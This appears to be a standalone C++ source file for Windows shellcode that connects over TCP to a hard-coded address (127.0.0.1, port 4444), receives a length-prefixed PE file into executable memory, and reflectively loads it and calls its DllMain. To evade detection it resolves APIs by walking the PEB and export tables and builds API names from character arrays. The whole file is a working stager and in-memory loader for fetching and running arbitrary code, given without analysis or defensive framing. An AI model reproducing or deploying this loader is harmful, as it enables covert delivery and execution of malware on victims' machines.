// shellcode.cpp

#include <windows.h>
#include <winternl.h>

#pragma code_seg(".text$A")

extern "C" void ShellcodeEntry();
extern "C" ULONG_PTR GetKernel32Base();
extern "C" ULONG_PTR CustomGetProcAddress(ULONG_PTR moduleBase, const char* funcName);

// Function Pointer Signatures
typedef HMODULE(WINAPI* fnLoadLibraryA)(LPCSTR);
typedef LPVOID(WINAPI* fnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef int(WINAPI* fnWSAStartup)(WORD, LPVOID);
typedef UINT_PTR(WINAPI* fnWSASocketA)(int, int, int, LPVOID, int, DWORD);
typedef int(WINAPI* fnConnect)(UINT_PTR, const sockaddr*, int);
typedef int(WINAPI* fnRecv)(UINT_PTR, char*, int, int);

// Target DLL Entry Point Signature
typedef BOOL(WINAPI* fnDllMain)(HINSTANCE, DWORD, LPVOID);

#define RAW_IP   0x7F000001     // 127.0.0.1
#define RAW_PORT 4444           // Port 4444

extern "C" __attribute__((section(".text$A"))) void ShellcodeEntry() {
    ULONG_PTR kernel32 = GetKernel32Base();
    if (!kernel32)
        return;

    // Resolve Essential Kernel32 APIs
    char strLoadLibrary[] = { 'L','o','a','d','L','i','b','r','a','r','y','A', 0 }; // LoadLibraryA()
    char strVirtualAlloc[] = { 'V','i','r','t','u','a','l','A','l','l','o','c', 0 }; // VirtualAlloc()
    
    fnLoadLibraryA pLoadLibraryA = (fnLoadLibraryA)CustomGetProcAddress(kernel32, strLoadLibrary);
    fnVirtualAlloc pVirtualAlloc = (fnVirtualAlloc)CustomGetProcAddress(kernel32, strVirtualAlloc);
    if (!pLoadLibraryA || !pVirtualAlloc)
        return;

    // Load Winsock
    char strWs2[] = { 'w','s','2','_','3','2','.','d','l','l', 0 }; // ws2_32.dll
    HMODULE hWs2 = pLoadLibraryA(strWs2);
    if (!hWs2)
        return;

    // Resolve Winsock APIs
    char strWSAStartup[] = { 'W','S','A','S','t','a','r','t','u','p', 0 }; // WSAStartup()
    char strWSASocketA[] = { 'W','S','A','S','o','c','k','e','t','A', 0 }; // WSASocketA()
    char strConnect[] = { 'c','o','n','n','e','c','t', 0 }; // connect()
    char strRecv[] = { 'r','e','c','v', 0 }; // recv()

    fnWSAStartup pWSAStartup = (fnWSAStartup)CustomGetProcAddress((ULONG_PTR)hWs2, strWSAStartup);
    fnWSASocketA pWSASocketA = (fnWSASocketA)CustomGetProcAddress((ULONG_PTR)hWs2, strWSASocketA);
    fnConnect pConnect = (fnConnect)CustomGetProcAddress((ULONG_PTR)hWs2, strConnect);
    fnRecv pRecv = (fnRecv)CustomGetProcAddress((ULONG_PTR)hWs2, strRecv);

    // Initialize Winsock Stack
    char wsaData[400];
    if (pWSAStartup(0x0202, &wsaData) != 0)
        return;

    // Open Socket
    UINT_PTR s = pWSASocketA(2, 1, 6, NULL, 0, 0); // AF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6
    if (s == (UINT_PTR)INVALID_HANDLE_VALUE)
        return;

    // Endianness Swap Mechanics for sockaddr_in structure layout
    unsigned int ip = RAW_IP;
    unsigned int net_ip = ((ip & 0xFF000000) >> 24) | ((ip & 0x00FF0000) >> 8) | ((ip & 0x0000FF00) << 8) | ((ip & 0x000000FF) << 24);
    unsigned short port = RAW_PORT;
    unsigned short net_port = ((port & 0xFF00) >> 8) | ((port & 0x00FF) << 8);

    // sockaddr struct
    sockaddr_in targetAddr;
    targetAddr.sin_family = 2; // AF_INET
    targetAddr.sin_port = net_port;
    targetAddr.sin_addr.s_addr = net_ip;

    if (pConnect(s, (sockaddr*)&targetAddr, sizeof(targetAddr)) != 0)
        return;

    // Receive 4-Byte Payload Length Integer Descriptor
    unsigned int payloadSize = 0;
    int bytesRead = pRecv(s, (char*)&payloadSize, 4, 0);
    if (bytesRead <= 0 || payloadSize == 0)
        return;

    // Allocate Temporary Buffer for Raw Incoming File Bytes
    char* rawBuf = (char*)pVirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!rawBuf)
        return;

    unsigned int totalReceived = 0;
    while (totalReceived < payloadSize)
    {
        int chunk = pRecv(s, rawBuf + totalReceived, payloadSize - totalReceived, 0);
        if (chunk <= 0)
            return;

        totalReceived += chunk;
    }

    // Reflective PE Header Verification & Space Mapping Phase
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)rawBuf;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(rawBuf + dosHeader->e_lfanew);
    DWORD sizeOfImage = ntHeaders->OptionalHeader.SizeOfImage;

    // Allocate continuous image-sized memory space matching preferred configurations if possible
    char* imageBase = (char*)pVirtualAlloc((LPVOID)ntHeaders->OptionalHeader.ImageBase, sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!imageBase)
        imageBase = (char*)pVirtualAlloc(NULL, sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!imageBase)
        return;

    // Copy File Headers over
    for (DWORD i = 0; i < ntHeaders->OptionalHeader.SizeOfHeaders; i++)
        imageBase[i] = rawBuf[i];

    // Copy Execution Sections Over
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
    {
        if (section[i].SizeOfRawData > 0)
        {
            char* dest = imageBase + section[i].VirtualAddress;
            char* src = rawBuf + section[i].PointerToRawData;
            for (DWORD j = 0; j < section[i].SizeOfRawData; j++)
                dest[j] = src[j];
        }
    }

    // Resolve Import Address Table Data Structures
    DWORD importDirRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (importDirRVA)
    {
        PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(imageBase + importDirRVA);
        while (importDesc->Name != 0)
        {
            HMODULE hLib = pLoadLibraryA((LPCSTR)(imageBase + importDesc->Name));
            if (hLib)
            {
                PIMAGE_THUNK_DATA thunkINT = (PIMAGE_THUNK_DATA)(imageBase + (importDesc->OriginalFirstThunk ? importDesc->OriginalFirstThunk : importDesc->FirstThunk));
                PIMAGE_THUNK_DATA thunkIAT = (PIMAGE_THUNK_DATA)(imageBase + importDesc->FirstThunk);

                while (thunkINT->u1.AddressOfData != 0)
                {
                    if (IMAGE_SNAP_BY_ORDINAL(thunkINT->u1.Ordinal))
                    {
                        thunkIAT->u1.Function = CustomGetProcAddress((ULONG_PTR)hLib, (LPCSTR)IMAGE_ORDINAL(thunkINT->u1.Ordinal));
                    }
                    else
                    {
                        PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)(imageBase + thunkINT->u1.AddressOfData);
                        thunkIAT->u1.Function = CustomGetProcAddress((ULONG_PTR)hLib, (LPCSTR)importByName->Name);
                    }

                    thunkINT++;
                    thunkIAT++;
                }
            }
            importDesc++;
        }
    }

    // Adjust Relocation Deltas if Loaded Base Address Shifted
    LONG_PTR delta = (LONG_PTR)(imageBase - ntHeaders->OptionalHeader.ImageBase);
    DWORD relocDirRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    if (delta != 0 && relocDirRVA != 0)
    {
        PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(imageBase + relocDirRVA);
        while (reloc->SizeOfBlock != 0)
        {
            DWORD count = (reloc->SizeOfBlock - sizeof(PIMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* entry = (WORD*)((char*)reloc + sizeof(PIMAGE_BASE_RELOCATION));
            for (DWORD i = 0; i < count; i++)
            {
                WORD type = entry[i] >> 12;
                WORD offset = entry[i] & 0x0FFF;
                if (type == 3) 
                {
                    // IMAGE_REL_BASED_HIGHLOW (x86 standard descriptor matching 32-bit compilation models)
                    DWORD* patchAddr = (DWORD*)(imageBase + reloc->VirtualAddress + offset);
                    *patchAddr += delta;
                }
            }

            reloc = (PIMAGE_BASE_RELOCATION)((char*)reloc + reloc->SizeOfBlock);
        }
    }

    // Jump and Run target DLL Entry Point
    if (ntHeaders->OptionalHeader.AddressOfEntryPoint != 0)
    {
        fnDllMain pDllMain = (fnDllMain)(imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
        pDllMain((HINSTANCE)imageBase, 1, NULL); // DLL_PROCESS_ATTACH = 1
    }
}

// System Environment Helpers
extern "C" __attribute__((section(".text$B"))) ULONG_PTR GetKernel32Base()
{
    ULONG_PTR kernel32 = 0;
    __asm__ (
        ".intel_syntax noprefix\n"
        "mov eax, fs:[0x30]\n"
        "mov eax, [eax + 0x0C]\n"
        "mov eax, [eax + 0x14]\n"
        "mov eax, [eax]\n"
        "mov eax, [eax]\n"
        "mov %0, [eax + 0x10]\n"
        ".att_syntax\n"
        : "=r" (kernel32)
    );

    return kernel32;
}

extern "C" __attribute__((section(".text$C"))) ULONG_PTR CustomGetProcAddress(ULONG_PTR moduleBase, const char* funcName)
{
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(moduleBase + dosHeader->e_lfanew);
    DWORD exportDirRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exportDirRVA)
        return 0;

    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)(moduleBase + exportDirRVA);
    DWORD* nameRVAs = (DWORD*)(moduleBase + exportDir->AddressOfNames);
    WORD* ordinals = (WORD*)(moduleBase + exportDir->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)(moduleBase + exportDir->AddressOfFunctions);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++)
    {
        char* currentName = (char*)(moduleBase + nameRVAs[i]);
        const char* f1 = funcName;
        char* f2 = currentName;
        while (*f1 && (*f1 == *f2))
        {
            f1++;
            f2++;
        }

        if (*f1 == 0 && *f2 == 0) 
        { 
            WORD ordinal = ordinals[i];
            return moduleBase + functions[ordinal];
        }
    }

    return 0;
}